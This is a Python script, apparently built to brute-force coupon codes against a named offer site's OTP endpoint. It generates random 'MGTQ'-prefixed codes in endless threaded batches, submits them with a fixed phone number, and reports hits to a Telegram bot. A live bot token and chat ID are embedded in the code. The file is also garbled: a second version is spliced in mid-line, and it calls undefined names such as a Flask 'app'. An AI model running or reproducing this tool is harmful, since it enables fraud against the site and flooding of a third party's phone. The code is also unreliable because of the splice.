import os
import time
import random
import string
import json
import threading
import requests
from concurrent.futures import ThreadPoolExecutor
from http.server import HTTPServer, BaseHTTPRequestHandler

# ================== CONFIGURATION ==================
BASE_URL = "https://www.ossw.theofferclub.in"
OTP_ENDPOINT = f"{BASE_URL}/home/generateOTP"
TEST_MOBILE = "9038529139"

NUM_CODES = 100000
MAX_WORKERS = 5
DELAY_PER_THREAD = 2.0

TELEGRAM_TOKEN = "8789555036:AAGw-EovbhVHoI81lD6QJ9AeFhn4eJNnFaY"
TELEGRAM_CHAT_ID = "5177144784"

print_lock = threading.Lock()

# ================== TELEGRAM ==================
def send_telegram_message(text):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    try:
        requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": text}, timeout=5)
    except Exception as e:
        print(f"Telegram error: {e}")

# ================== CODE GENERATION ==================
def generate_random_code() -> str:
    prefix = "MGTQ"
    chars = string.ascii_uppercase + string.digits
    return prefix + ''.join(random.choices(chars, k=6))

# ================== CODE CHECKER ==================
def check_code(code: str, mobile: str = TEST_MOBILE) -> dict:
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Referer": "https://www.ossw.theofferclub.in/",
        "Origin": "https://www.ossw.theofferclub.in",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    data = {"phone": mobile, "ccode": code}
    start_time = time.time()
    try:
        response = requests.post(OTP_ENDPOINT, data=data, headers=headers, timeout=15)
        response_time = round((time.time() - start_time) * 1000, 2)
        result = {
            "code": code,
            "status_code": response.status_code,
            "response_time_ms": response_time,
            "valid": False,
            "message": "",
        }
        if response.status_code == 200:
            try:
                json_resp = response.json()
                if json_resp.get("status") == "success":
                    result["valid"] = True
                    result["message"] = "✅ VALID - OTP Sent"
                elif json_resp.get("status") == "failure":
                    msg = json_resp.get("msg1") or json_resp.get("msg") or "failure"
                    result["message"] = f"❌ {msg}"
                elif json_resp.get("status") == "code_failure":
                    result["message"] = "❌ Invalid code"
                else:
                    result["message"] = f"❌ {json_resp.get('status')}"
            except:
                result["message"] = "❌ JSON parse error"
        else:
            result["message"] = f"❌ HTTP {response.status_code}"
        return result
    except Exception as e:
        return {
            "code": code,
            "status_code": 0,
            "response_time_ms": round((time.time() - start_time) * 1000, 2),
            "valid": False,
            "message": f"❌ Error: {str(e)}",
        }

# ================== PROCESS CODE ==================
def process_code(code: str):
    result = check_code(code)
    with print_lock:
        print(f"🔍 {code} -> {result['message']} ({result['response_time_ms']}ms)")
    if result["valid"]:
        msg = f"🎉 VALID CODE FOUND!\n🔑 {code}\n📱 {TEST_MOBILE}\n⏰ {time.ctime()}"
        send_telegram_message(msg)
        with open("valid_codes.txt", "a") as f:
            f.write(f"{code} | {TEST_MOBILE} | {time.ctime()}\n")
        print(f"🎉 VALID: {code}")
    time.sleep(DELAY_PER_THREAD)
    return result

# ================== VALIDATOR LOOP ==================
def run_validator():
    send_telegram_message("🚀 Validator started (pure Python, no Flask)")
    print("Validator running. Checking codes...")
    while True:
        codes = [generate_random_code() for _ in range(NUM_CODES)]
        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            executor.map(process_code, codes)
        print(f"Batch done. Sleeping 5 sec...")
        time.sleep(5)

# ================== SIMPLE HTTP KEEP-ALIVE ==================
class KeepAliveHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Validator is running")
    def log_message(self, format, *args):
        pass  # suppress logs

def start_http_server():
    port = int(os.environ.get("PORT", 5000))
    server = HTTPServer(('0.0.0.0', port), KeepAliveHandler)
    print(f"HTTP keep-alive server running on port {port}")
    server.serve_forever()

# ================== MAIN ==================
if __name__ == "__main__":
    # Start validator in background
    threading.Thread(target=run_validator, daemon=True).start()
    # Start HTTP server (blocks main thread, keeps Render alive)
    start_http_server()        print(f"   Status : {result['message']}")
        print(f"   HTTP   : {result['status_code']} | Time: {result['response_time_ms']}ms")
        print(f"   Site Status: {result.get('site_status', 'N/A')}")
        
        # Show full response
        print("   Full Response:")
        if isinstance(result['raw_response'], dict):
            print(json.dumps(result['raw_response'], indent=2))
        else:
            resp_str = str(result['raw_response'])
            print(resp_str[:600] + "..." if len(resp_str) > 600 else resp_str)
        
        print("-" * 90)
        
        if result["valid"]:
            # Send to Telegram
            telegram_msg = f"🎉 VALID CODE FOUND!\n🔑 Code: {code}\n📱 Mobile: {TEST_MOBILE}\n⏱️ {time.strftime('%Y-%m-%d %H:%M:%S')}"
            send_telegram_message(telegram_msg)
            
            # Save to file
            with open("valid_codes.txt", "a") as f:
                f.write(f"{code} | {TEST_MOBILE} | {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            
            print(f"🎉🎉 VALID CODE FOUND: {code} 🎉🎉\n")
    
    time.sleep(DELAY_PER_THREAD)
    return result

# ================== MAIN VALIDATOR LOOP ==================
def run_validator():
    send_telegram_message("🚀 Oaksmith Validator Started on Render (Full Version)")
    print("🚀 Oaksmith Multi-Threaded Code Generator & Validator")
    print("=" * 90)
    print(f"Target Mobile: {TEST_MOBILE} | Threads: {MAX_WORKERS} | Codes per batch: {NUM_CODES}")
    print("=" * 90)
    
    while True:
        # Generate codes
        codes = [generate_random_code() for _ in range(NUM_CODES)]
        start_time = time.time()
        valid_count = 0
        
        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            futures = [executor.submit(process_code, code) for code in codes]
            for future in futures:
                try:
                    result = future.result()
                    if result["valid"]:
                        valid_count += 1
                except Exception as e:
                    with print_lock:
                        print(f"Thread error: {e}")
        
        batch_time = round(time.time() - start_time, 2)
        with print_lock:
            print("\n" + "="*90)
            print(f"📊 BATCH SUMMARY")
            print("="*90)
            print(f"Codes tested: {NUM_CODES} | Valid: {valid_count} | Time: {batch_time}s | Speed: {round(NUM_CODES/batch_time, 1)} codes/sec")
            print("="*90 + "\n")
        
        # Short pause between batches
        time.sleep(5)

# ================== FLASK WEB SERVER ==================
@app.route('/')
def home():
    return "OTP Validator is running (Full version)", 200

@app.route('/status')
def status():
    return json.dumps({"status": "running", "mobile": TEST_MOBILE, "codes_per_batch": NUM_CODES}), 200

# ================== ENTRY POINT ==================
if __name__ == "__main__":
    # Start validator in background thread
    validator_thread = threading.Thread(target=run_validator, daemon=True)
    validator_thread.start()
    
    # Get port from environment (Render sets this)
    port = int(os.environ.get("PORT", 5000))
    
    # Run Flask web server
    app.run(host='0.0.0.0', port=port)
